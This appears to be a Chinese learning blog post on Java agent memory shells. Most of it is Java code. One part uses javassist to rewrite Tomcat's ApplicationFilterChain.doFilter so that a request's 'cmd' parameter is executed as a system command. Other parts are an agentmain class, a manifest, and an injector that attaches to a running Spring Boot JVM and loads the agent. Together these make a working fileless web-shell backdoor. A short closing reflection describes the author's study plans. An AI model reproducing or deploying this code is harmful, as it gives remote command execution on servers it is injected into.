![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706249152119-688b526a-868a-445e-9184-c60b3a145ad5.png#averageHue=%232a2d33&clientId=uc9d4b41e-c695-4&from=paste&height=109&id=u40bccdab&originHeight=163&originWidth=1247&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=156919&status=done&style=none&taskId=u9b61b101-da2d-4810-87cc-c88d1e91de7&title=&width=831.3333333333334)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/36078896/1706249165800-c60da297-472d-472b-ad82-7c63438da01b.png#averageHue=%232a2e34&clientId=uc9d4b41e-c695-4&from=paste&height=193&id=uc294bf54&originHeight=289&originWidth=1515&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=323639&status=done&style=none&taskId=u625455c3-8c92-4522-86d5-a61433d1b16&title=&width=1010)

### 注入过程
首先先写一下最终通过 javassit 修改字节码的内容
```java
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;
import javassist.*;
public class Hello_Transform implements ClassFileTransformer {
    @Override
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        try{
            //获取CtClass对象的容器 ClassPool
            ClassPool classPool=ClassPool.getDefault();

            //添加额外的类搜索路径
            if(classBeingRedefined!=null){
                ClassClassPath ccp=new ClassClassPath(classBeingRedefined);
                classPool.insertClassPath(ccp);
            }

            //通过Ct获取到我们待会要修改字节码的类
            CtClass ctClass=classPool.get("org.apache.catalina.core.ApplicationFilterChain");
            System.out.println(ctClass);

            //获取目标方法
            CtMethod ctMethod= ctClass.getDeclaredMethod("doFilter");

            //设置方法体，也就是具体修改的修改字节码的部分
            String body = "{" +
                    "javax.servlet.http.HttpServletRequest request = $1\n;" +
                    "String cmd=request.getParameter(\"cmd\");\n" +
                    "if (cmd !=null){\n" +
                    "  Runtime.getRuntime().exec(cmd);\n" +
                    "  }"+
                    "}";
            ctMethod.setBody(body);

            //返回目标类字节码
            byte[] bytes =ctClass.toBytecode();
            return bytes;

        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
```
然后写一下 Agentmain 以及 MF 文件，之后打包成 jar 包
```java
import org.example.Hello_Transform;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;
public class JAVA_Agentmain {
    public static void agentmain(String args, Instrumentation inst) throws Exception {
        Class [] classes=inst.getAllLoadedClasses();

        for (Class cls:classes){
            if(cls.getName().equals("org.apache.catalina.core.ApplicationFilterChain")){
                inst.addTransformer(new Hello_Transform(),true);
                inst.retransformClasses(cls);

            }

        }
    }

}
```
```java
Manifest-Version: 1.0
Agent-Class: org.SpringMeshell.JAVA_Agentmain
Can-Redefine-Classes: true
Can-Retransform-Classes: true

```
最终就是 inject 最终注入类了
```java
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class Inject_Agent {
    public static void main(String[] args) throws Exception {
        //调用VirtualMachine.list()获取正在运行的JVM列表
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd : list){
            System.out.println(vmd.displayName());
            //遍历每一个正在运行的JVM，如果JVM名称为Sleep_Hello则连接该JVM并加载特定Agent
            if (vmd.displayName().equals("JavaAgentSpringBootApplication")){
                System.out.println("正在注入");
                //连接指定JVM
                VirtualMachine virtualMachine = VirtualMachine.attach(vmd.id());

                //加载Agent
                virtualMachine.loadAgent("H:\\javasecurity\\AgentMeshell\\target\\AgentInstrumentation-1.0-SNAPSHOT-jar-with-dependencies.jar");

                //断开JVM连接
                virtualMachine.detach();
            }
        }
    }
}
```
之后的实现就不做了，因为 Spring 这块的知识还在补习

## 回顾一下
其实学 agent 内存马我的目的不是其本身，而是它的前置知识很诱人，就是 JAVAagent 和 javassist，所以这块的重点也自然放在这两个上，然后现阶段的主要工作是在做前面知识的复习，以及后续知识的推进，JAVAagent 这块的知识对于我来说是新的知识，所以接下来是对前面旧知识的复习，包括 Spring 基础，RMI，JNDI 等
